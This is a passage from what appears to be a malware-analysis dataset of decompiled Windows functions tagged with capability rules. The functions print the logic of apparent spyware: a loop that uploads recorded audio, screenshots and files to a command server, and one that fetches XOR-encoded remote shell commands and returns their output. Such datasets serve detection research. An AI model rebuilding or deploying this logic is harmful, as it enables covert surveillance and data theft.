}\n        pcVar4 = *(*0x444b3c + 8);\n        pcVar3 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        fcn.00406000(uVar2, *(*0x444b3c + 8), pcVar4 - pcVar3);\n        fcn.004227e9(pcVar6);\n        uStack20 = fcn.004015f0();\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar4 = *(*0x444b3c + 0x94);\n        pcVar3 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        pcVar8 = fcn.00405f40();\n        pcVar5 = pcVar8 + 1;\n        do {\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar1 != '\\0');\n        arg_8h_00 = fcn.0041ff97(pcVar4 + pcVar8 + ((0x40 - pcVar5) - pcVar3));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_10h = *(*0x444b3c + 0x94);\n        fcn.00405f40();\n        fcn.00420bd5(arg_8h_00, \"%s?enc&comp=%s&ext=rec.wav\", arg_10h);\n        do {\n            iVar7 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar2);\n            if (iVar7 != 0) {\n                uStack28 = 0;\n                iVar7 = fcn.00401db0(uVar2);\n                uVar2 = uStack24;\n                if (iVar7 != 0) {\n                    iVar10 = 0;\n                    uStack32 = 0;\n                    iVar9 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(&uStack32, 0);\n                    if (iVar9 != 0) {\n                        iVar10 = fcn.004046c0(iVar7, uStack28, &uStack32);\n                    }\n                    fcn.00420c59(iVar7);\n                    uVar2 = uStack24;\n                    if (iVar10 != 0) goto code_r0x0040a129;\n                }\n            }\n            iVar7 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar2);\n            if (iVar7 == 0) goto code_r0x0040a129;\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n        } while( true );\n    }\n    uVar2 = 30000;\n    goto code_r0x0040a158;\ncode_r0x0040a129:\n    fcn.00420c59(arg_8h_00);\n    fcn.00420c59(uStack20);\n    fcn.004227e9(uVar2);\n    fcn.00420c59(uVar2);\n    uVar2 = 300000;\ncode_r0x0040a158:\n    (*_sym.imp.KERNEL32.DLL_Sleep)(uVar2);\n    fcn.00420c59(pcVar6);\n    if (iStack12 != 0) {\n        return 0;\n    }\n    goto code_r0x00409eff;\n}\n",
        "token_count": 1465
    },
    "0040a180": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a180(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint arg_10h;\n    uint uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint arg_8h_00;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint uStack28;\n    uint uStack24;\n    char *pcStack20;\n    uint uStack16;\n    int32_t iStack12;\n    \n    uVar2 = fcn.00420e6f(0);\n    fcn.00420c64(uVar2);\n    iStack12 = 0;\n    if (arg_8h != 0) {\n        iStack12 = arg_8h;\n    }\ncode_r0x0040a1b2:\n    pcVar3 = fcn.004020c0();\n    pcVar4 = fcn.00420d1e(\"TEMP\");\n    pcVar6 = pcVar4 + 1;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    pcVar5 = pcVar3;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    pcVar6 = fcn.0041ff97(pcVar4 + pcVar5 + ((8 - (pcVar3 + 1)) - pcVar6));\n    pcStack20 = pcVar6;\n    uVar2 = fcn.00420d1e(\"TEMP\");\n    fcn.00420bd5(pcVar6, 0x43c26c, uVar2);\n    fcn.00420c59(pcVar3);\n    iVar7 = fcn.0040a440(pcVar6);\n    if (iVar7 == 0) {\n        pcVar3 = pcVar6;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        uVar2 = fcn.0041ff97(pcVar3 + (8 - (pcVar6 + 1)));\n        fcn.00420bd5(uVar2, \"%s.cr\", pcVar6);\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar4 = *(*0x444b3c + 8);\n        pcVar3 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        fcn.00406000(uVar2, *(*0x444b3c + 8), pcVar4 - pcVar3);\n        fcn.004227e9(pcVar6);\n        uStack16 = fcn.004015f0();\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar4 = *(*0x444b3c + 0x94);\n        pcVar3 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        pcVar8 = fcn.00405f40();\n        pcVar5 = pcVar8 + 1;\n        do {\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar1 != '\\0');\n        arg_8h_00 = fcn.0041ff97(pcVar4 + pcVar8 + ((0x40 - pcVar5) - pcVar3));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_10h = *(*0x444b3c + 0x94);\n        fcn.00405f40();\n        fcn.00420bd5(arg_8h_00, \"%s?enc&comp=%s&ext=sc.jpg\", arg_10h);\n        do {\n            iVar7 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar2);\n            if (iVar7 != 0) {\n                uStack24 = 0;\n                iVar7 = fcn.00401db0(uVar2);\n                pcVar6 = pcStack20;\n                if (iVar7 != 0) {\n                    iVar10 = 0;\n                    uStack28 = 0;\n                    iVar9 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(&uStack28, 0);\n                    if (iVar9 != 0) {\n                        iVar10 = fcn.004046c0(iVar7, uStack24, &uStack28);\n                    }\n                    fcn.00420c59(iVar7);\n                    pcVar6 = pcStack20;\n                    if (iVar10 != 0) goto code_r0x0040a3dc;\n                }\n            }\n            iVar7 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar2);\n            if (iVar7 == 0) goto code_r0x0040a3dc;\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n        } while( true );\n    }\n    uVar2 = 30000;\n    goto code_r0x0040a414;\ncode_r0x0040a3dc:\n    fcn.00420c59(uStack16);\n    fcn.00420c59(arg_8h_00);\n    fcn.004227e9(uVar2);\n    fcn.00420c59(uVar2);\n    uVar2 = 300000;\ncode_r0x0040a414:\n    (*_sym.imp.KERNEL32.DLL_Sleep)(uVar2);\n    fcn.00420c59(pcVar6);\n    if (iStack12 != 0) {\n        return 0;\n    }\n    goto code_r0x0040a1b2;\n}\n",
        "token_count": 1458
    },
    "0040a740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a740(char *pszPath)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint arg_10h;\n    int32_t iVar3;\n    char *pcVar4;\n    uint arg_14h;\n    uint arg_18h;\n    uint uVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(pszPath);\n    if (iVar3 != 0) {\n        pcVar4 = pszPath;\n        do {\n            cVar2 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar2 != '\\0');\n        arg_14h = fcn.0041ff97(pcVar4 - (pszPath + 1));\n        pcVar4 = pszPath;\n        do {\n            cVar2 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar2 != '\\0');\n        arg_18h = fcn.0041ff97(pcVar4 - (pszPath + 1));\n        fcn.00423615(pszPath, 0, 0, arg_14h, arg_18h);\n        uVar5 = fcn.004015f0();\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar6 = *(*0x444b3c + 0x94);\n        pcVar4 = pcVar6 + 1;\n        do {\n            cVar2 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar2 != '\\0');\n        pcVar7 = fcn.00405f40();\n        pcVar1 = pcVar7 + 1;\n        do {\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        pcVar8 = pszPath;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\n        arg_8h = fcn.0041ff97(pcVar6 + pcVar7 + pcVar8 + (((-(pszPath + 1) - pcVar1) + 0x80) - pcVar4));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_10h = *(*0x444b3c + 0x94);\n        fcn.00405f40(arg_14h, arg_18h);\n        fcn.00420bd5(arg_8h, \"%s?comp=%s&ext=%s.%s\", arg_10h);\n        iVar3 = fcn.00404910(arg_8h);\n        while ((iVar3 == 0 && (iVar3 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(pszPath),  iVar3 != 0))) {\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n            iVar3 = fcn.00404910(arg_8h);\n        }\n        fcn.00420c59(arg_14h);\n        fcn.00420c59(arg_18h);\n        fcn.00420c59(uVar5);\n        fcn.00420c59(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 829
    },
    "0040a8b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040a8b0(void)\n\n{\n    char cVar1;\n    uint arg_10h;\n    uint uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uchar auStack284 [4];\n    int32_t iStack280;\n    uint uStack276;\n    char acStack272 [260];\n    uint32_t uStack12;\n    \n    uStack12 = *0x441480 ^ auStack284;\n    uVar2 = fcn.00420e6f(0);\n    fcn.00420c64(uVar2);\ncode_r0x0040a8e0:\n    uStack276 = fcn.004015f0();\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    pcVar3 = *(*0x444b3c + 0x94);\n    pcVar5 = pcVar3 + 1;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    pcVar4 = fcn.00405f40();\n    pcVar6 = pcVar4 + 1;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = fcn.0041ff97(pcVar3 + pcVar4 + ((0x20 - pcVar6) - pcVar5));\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    arg_10h = *(*0x444b3c + 0x94);\n    fcn.00405f40();\n    fcn.00420bd5(uVar2, \"%s?cstorage=search&comp=%s\", arg_10h);\n    pcVar5 = fcn.00404300();\n    while (pcVar5 == NULL) {\n        (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n        pcVar5 = fcn.00404300();\n    }\n    fcn.00420c59(uVar2);\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    pcVar6 = *(*0x444b3c + 8);\n    pcVar3 = pcVar6 + 1;\n    do {\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    iStack280 = pcVar6 - pcVar3;\n    pcVar3 = pcVar5;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    iVar9 = *(*0x444b3c + 8);\n    iVar7 = 0;\n    iVar8 = 0;\n    if (0 < pcVar3 - (pcVar5 + 1)) {\n        do {\n            if (iStack280 <= iVar8) {\n                iVar8 = 0;\n            }\n            pcVar5[iVar7] = pcVar5[iVar7] ^ -*(iVar8 + iVar9);\n            iVar7 = iVar7 + 1;\n            iVar8 = iVar8 + 1;\n        } while (iVar7 < pcVar3 - (pcVar5 + 1));\n    }\n    iVar9 = 0;\n    do {\n        acStack272[0] = '\\0';\n        pcVar3 = pcVar5;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        iStack280 = pcVar3 - (pcVar5 + 1);\n        iVar7 = 0;\n        while( true ) {\n            if (iStack280 <= iVar9) {\n                fcn.00420c59(uStack276);\n                fcn.00420c59(pcVar5);\n                (*_sym.imp.KERNEL32.DLL_Sleep)(300000);\n                goto code_r0x0040a8e0;\n            }\n            if (pcVar5[iVar9] == '\\n') goto code_r0x0040aa97;\n            acStack272[iVar7] = pcVar5[iVar9];\n            iVar7 = iVar7 + 1;\n            if (iStack280 + -1 <= iVar9) break;\n            iVar9 = iVar9 + 1;\n        }\n        if (iVar7 < 0x100) {\ncode_r0x0040aa97:\n            acStack272[iVar7] = '\\0';\n        }\n        iVar9 = iVar9 + 1;\n        fcn.0040ada0(acStack272);\n    } while( true );\n}\n",
        "token_count": 1168
    },
    "0040b2f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040b2f0(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    char *pcVar11;\n    int32_t iVar12;\n    uint8_t *puVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    bool bVar16;\n    int32_t iStack292;\n    char *pcStack288;\n    int32_t iStack284;\n    uint uStack280;\n    int32_t iStack276;\n    uint8_t auStack272 [260];\n    uint32_t uStack12;\n    \n    uStack12 = *0x441480 ^ &iStack292;\n    uVar4 = fcn.00420e6f(0);\n    fcn.00420c64(uVar4);\ncode_r0x0040b320:\n    uStack280 = fcn.004015f0();\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    pcVar5 = *(*0x444b3c + 0x94);\n    pcVar7 = pcVar5 + 1;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    pcVar6 = fcn.00405f40();\n    pcVar8 = pcVar6 + 1;\n    do {\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    uVar4 = fcn.0041ff97(pcVar5 + pcVar6 + ((0x20 - pcVar8) - pcVar7));\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    uVar3 = *(*0x444b3c + 0x94);\n    fcn.00405f40();\n    fcn.00420bd5(uVar4, \"%s?cstorage=shell&comp=%s\", uVar3);\n    pcVar7 = fcn.00404300();\n    while (pcStack288 = pcVar7,  pcVar7 == NULL) {\n        (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n        pcVar7 = fcn.00404300();\n    }\n    fcn.00420c59(uVar4);\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    pcVar8 = *(*0x444b3c + 8);\n    pcVar5 = pcVar8 + 1;\n    do {\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n    } while (cVar1 != '\\0');\n    iStack292 = pcVar8 - pcVar5;\n    pcVar5 = pcVar7 + 1;\n    do {\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    iVar15 = *(*0x444b3c + 8);\n    iVar9 = 0;\n    iVar12 = 0;\n    if (0 < pcVar7 - pcVar5) {\n        do {\n            if (iStack292 <= iVar12) {\n                iVar12 = 0;\n            }\n            pcStack288[iVar9] = pcStack288[iVar9] ^ -*(iVar12 + iVar15);\n            iVar9 = iVar9 + 1;\n            iVar12 = iVar12 + 1;\n        } while (iVar9 < pcVar7 - pcVar5);\n    }\n    iVar15 = 0;\n    do {\n        do {\n            auStack272[0] = 0;\n            pcVar7 = pcStack288;\n            do {\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar9 = 0;\n            while( true ) {\n                if (pcVar7 - (pcStack288 + 1) <= iVar15) {\n                    fcn.00420c59(uStack280);\n                    fcn.00420c59(pcStack288);\n                    (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n                    goto code_r0x0040b320;\n                }\n                if (pcStack288[iVar15] == 10) goto code_r0x0040b4e9;\n                auStack272[iVar9] = pcStack288[iVar15];\n                iVar9 = iVar9 + 1;\n                if ((pcVar7 - (pcStack288 + 1)) + -1 <= iVar15) break;\n                iVar15 = iVar15 + 1;\n            }\n            if (iVar9 < 0x100) {\ncode_r0x0040b4e9:\n                auStack272[iVar9] = 0;\n            }\n            iStack284 = iVar15 + 1;\n            iVar15 = iStack284;\n        } while (auStack272[0] == 0x23);\n        puVar13 = 0x43c488;\n        puVar10 = auStack272;\n        do {\n            uVar2 = *puVar10;\n            bVar16 = uVar2 < *puVar13;\n            if (uVar2 != *puVar13) {\ncode_r0x0040b527:\n                iVar9 = (1 - bVar16) - (bVar16 != 0);\n                goto code_r0x0040b52c;\n            }\n            if (uVar2 == 0) break;\n            uVar2 = puVar10[1];\n            bVar16 = uVar2 < puVar13[1];\n            if (uVar2 != puVar13[1]) goto code_r0x0040b527;\n            puVar10 = puVar10 + 2;\n            puVar13 = puVar13 + 2;\n        } while (uVar2 != 0);\n        iVar9 = 0;\ncode_r0x0040b52c:\n        if (iVar9 != 0) {\n            pcVar5 = fcn.0040b6a0(auStack272);\n            pcVar7 = pcVar5;\n            do {\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar15 = pcVar7 - (pcVar5 + 1);\n            iStack292 = iVar15;\n            if (*0x444a85 == '\\0') {\n                fcn.004060f0();\n                *0x444a85 = '\\x01';\n            }\n            pcVar8 = *(*0x444b3c + 8);\n            pcVar7 = pcVar8 + 1;\n            do {\n                cVar1 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar1 != '\\0');\n            iStack276 = pcVar8 - pcVar7;\n            if (*0x444a85 == '\\0') {\n                fcn.004060f0();\n                *0x444a85 = '\\x01';\n            }\n            iVar9 = *(*0x444b3c + 8);\n            iVar12 = 0;\n            iVar14 = 0;\n            if (0 < iVar15) {\n                do {\n                    if (iStack276 <= iVar14) {\n                        iVar14 = 0;\n                    }\n                    pcVar5[iVar12] = pcVar5[iVar12] ^ -*(iVar14 + iVar9);\n                    iVar12 = iVar12 + 1;\n                    iVar14 = iVar14 + 1;\n                } while (iVar12 < iStack292);\n            }\n            if (*0x444a85 == '\\0') {\n                fcn.004060f0();\n                *0x444a85 = '\\x01';\n            }\n            pcVar8 = *(*0x444b3c + 0x94);\n            pcVar7 = pcVar8 + 1;\n            do {\n                cVar1 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar1 != '\\0');\n            pcVar11 = fcn.00405f40();\n            pcVar6 = pcVar11 + 1;\n            do {\n                cVar1 = *pcVar11;\n                pcVar11 = pcVar11 + 1;\n            } while (cVar1 != '\\0');\n            uVar4 = fcn.0041ff97(pcVar8 + pcVar11 + ((0x40 - pcVar6) - pcVar7));\n            if (*0x444a85 == '\\0') {\n                fcn.004060f0();\n                *0x444a85 = '\\x01';\n            }\n            uVar3 = *(*0x444b3c + 0x94);\n            fcn.00405f40();\n            fcn.00420bd5(uVar4, \"%s?enc&comp=%s&ext=shell.txt\", uVar3);\n            iVar15 = iStack292;\n            while( true ) {\n                iStack292 = 0;\n                iVar9 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(&iStack292, 0);\n                if ((iVar9 != 0) && (iVar9 = fcn.004046c0(pcVar5, iVar15, &iStack292),  iVar9 != 0)) break;\n                (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n            }\n            fcn.00420c59(uVar4);\n            fcn.00420c59(pcVar5);\n            iVar15 = iStack284;\n        }\n    } while( true );\n}\n",
        "token_count": 2264
    },
    "0040b6a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b6a0(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint uVar9;\n    int32_t iVar10;\n    char *pcVar11;\n    uint *puVar12;\n    uint arg_14h;\n    uint uVar13;\n    uint *puVar14;\n    uint8_t *puVar15;\n    char *pcVar16;\n    ushort *puVar17;\n    int32_t **in_FS_OFFSET;\n    bool bVar18;\n    char *in_stack_fffffb9c;\n    uchar auStack1108 [3];\n    uchar uStack1105;\n    uchar auStack1104 [32];\n    char acStack1072 [260];\n    char *pcStack812;\n    char *pcStack808;\n    uchar auStack804 [4];\n    char acStack800 [256];\n    uint8_t auStack544 [256];\n    uchar auStack288 [260];\n    uint32_t uStack28;\n    int32_t *piStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0xffffffff;\n    uStack16 = 0x438176;\n    piStack20 = *in_FS_OFFSET;\n    uStack28 = *0x441480 ^ &stack0xfffffb9c;\n    *in_FS_OFFSET = &piStack20;\n    fcn.00405130(arg_8h, 0, 0, auStack544, 0x100);\n    puVar15 = 0x43e188;\n    puVar5 = auStack544;\n    do {\n        uVar1 = *puVar5;\n        bVar18 = uVar1 < *puVar15;\n        if (uVar1 != *puVar15) {\ncode_r0x0040b731:\n            iVar6 = (1 - bVar18) - (bVar18 != 0);\n            goto code_r0x0040b736;\n        }\n        if (uVar1 == 0) break;\n        uVar1 = puVar5[1];\n        bVar18 = uVar1 < puVar15[1];\n        if (uVar1 != puVar15[1]) goto code_r0x0040b731;\n        puVar5 = puVar5 + 2;\n        puVar15 = puVar15 + 2;\n    } while (uVar1 != 0);\n    iVar6 = 0;\ncode_r0x0040b736:\n    if (iVar6 == 0) {\n        fcn.00405130(arg_8h, 0x22, 0x22, acStack800, 0x100);\n        pcVar7 = acStack800;\n        do {\n            pcVar8 = pcVar7;\n            pcVar7 = pcVar8 + 1;\n        } while (*pcVar8 != '\\0');\n        if (pcVar8[-1] != '\\\\') {\n            puVar17 = auStack804 + 3;\n            do {\n                pcVar7 = puVar17 + 1;\n                puVar17 = puVar17 + 1;\n            } while (*pcVar7 != '\\0');\n            *puVar17 = *0x43e18c;\n        }\n        iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)();\n        if (iVar6 == 0) {\n            puVar12 = fcn.0041ff97();\n            *puVar12 = str.DIR_NOT_FOUND._0_4_;\n            puVar12[1] = str.DIR_NOT_FOUND._4_4_;\n            puVar12[2] = str.DIR_NOT_FOUND._8_4_;\n            *(puVar12 + 3) = str.DIR_NOT_FOUND._12_2_;\n            goto code_r0x0040c30e;\n        }\n        pcStack808 = fcn.00422819(1);\n        auStack804 = 0;\n        pcVar7 = acStack800;\n        uStack12 = 0;\n        do {\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        pcVar7 = fcn.0041ff97();\n        fcn.00420bd5(pcVar7, \"Listing of %s:\\n\\n\", acStack800);\n        pcVar8 = pcVar7;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\n        fcn.004050e0(pcVar7);\n        fcn.00420c59();\n        pcVar8 = auStack804;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\n        uVar9 = fcn.0041ff97();\n        fcn.00420bd5(uVar9, 0x43e1a4, auStack804);\n        iVar6 = fcn.00422c32(uVar9, auStack1108);\n        pcVar8 = pcStack812;\n        if ((iVar6 != 0) && (pcVar16 = pcStack808,  iVar6 != -1)) {\n            do {\n                in_stack_fffffb9c = acStack1072;\n                do {\n                    cVar2 = *in_stack_fffffb9c;\n                    in_stack_fffffb9c = in_stack_fffffb9c + 1;\n                } while (cVar2 != '\\0');\n                in_stack_fffffb9c = in_stack_fffffb9c + -(acStack1072 + 1);\n                pcVar11 = pcVar16 + in_stack_fffffb9c;\n                iVar10 = fcn.004228ad(pcStack812, pcVar11 + 1);\n                if (pcVar16 < pcVar11) {\n                    in_stack_fffffb9c = in_stack_fffffb9c + pcVar16;\n                    iVar3 = -pcVar16;\n                    do {\n                        pcVar16[iVar10] = pcVar16[acStack1072 + iVar3];\n                        pcVar16 = pcVar16 + 1;\n                    } while (pcVar16 < in_stack_fffffb9c);\n                }\n                pcVar11[iVar10] = '\\0';\n                pcVar8 = fcn.004228ad(iVar10, pcVar11 + 2);\n                pcVar16 = pcVar11 + 1;\n                if (pcVar11 < pcVar16) {\n                    iVar10 = 0x43e1ac - pcVar11;\n                    do {\n                        pcVar11[pcVar8] = pcVar11[iVar10];\n                        pcVar11 = pcVar11 + 1;\n                    } while (pcVar11 < pcVar16);\n                }\n                pcStack808 = pcVar16;\n                pcVar16[pcVar8] = '\\0';\n                iVar10 = fcn.00422d59(iVar6, auStack1108);\n                pcStack812 = pcVar8;\n            } while (iVar10 == 0);\n            fcn.00422e87(iVar6);\n        }\n        fcn.00420c59();\n        pcVar16 = pcVar8;\n        do {\n            cVar2 = *pcVar16;\n            pcVar16 = pcVar16 + 1;\n        } while (cVar2 != '\\0');\n        iVar6 = fcn.0041ff97();\n        iVar6 = iVar6 - pcVar8;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8[iVar6] = cVar2;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\ncode_r0x0040c304:\n        fcn.004214f1(pcVar7);\n    }\n    else {\n        pcVar7 = \"upload\";\n        puVar5 = auStack544;\n        do {\n            uVar1 = *puVar5;\n            bVar18 = uVar1 < *pcVar7;\n            if (uVar1 != *pcVar7) {\ncode_r0x0040b9f0:\n                iVar6 = (1 - bVar18) - (bVar18 != 0);\n                goto code_r0x0040b9f5;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar5[1];\n            bVar18 = uVar1 < pcVar7[1];\n            if (uVar1 != pcVar7[1]) goto code_r0x0040b9f0;\n            puVar5 = puVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n        } while (uVar1 != 0);\n        iVar6 = 0;\ncode_r0x0040b9f5:\n        if (iVar6 == 0) {\n            fcn.00405130(arg_8h, 0x22, 0x22, acStack800, 0x100);\n            fcn.004015f0();\n            if (*0x444a85 == '\\0') {\n                fcn.004060f0();\n                *0x444a85 = '\\x01';\n            }\n            pcVar7 = *(*0x444b3c + 0x94);\n            do {\n                cVar2 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar2 != '\\0');\n            pcVar7 = fcn.00405f40();\n            do {\n                cVar2 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar2 != '\\0');\n            pcVar7 = acStack800;\n            do {\n                cVar2 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar2 != '\\0');\n            uVar9 = fcn.0041ff97();\n            iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)();\n            if (iVar6 == 0) {\n                fcn.00420c59();\n                fcn.00420c59();\n                puVar12 = fcn.0041ff97();\n                *puVar12 = str.FILE_NOT_FOUND._0_4_;\n                puVar12[1] = str.FILE_NOT_FOUND._4_4_;\n                puVar12[2] = str.FILE_NOT_FOUND._8_4_;\n                *(puVar12 + 3) = str.FILE_NOT_FOUND._12_2_;\n                *(puVar12 + 0xe) = str.FILE_NOT_FOUND[14];\n            }\n            else {\n                pcVar7 = acStack800;\n                do {\n                    cVar2 = *pcVar7;\n                    pcVar7 = pcVar7 + 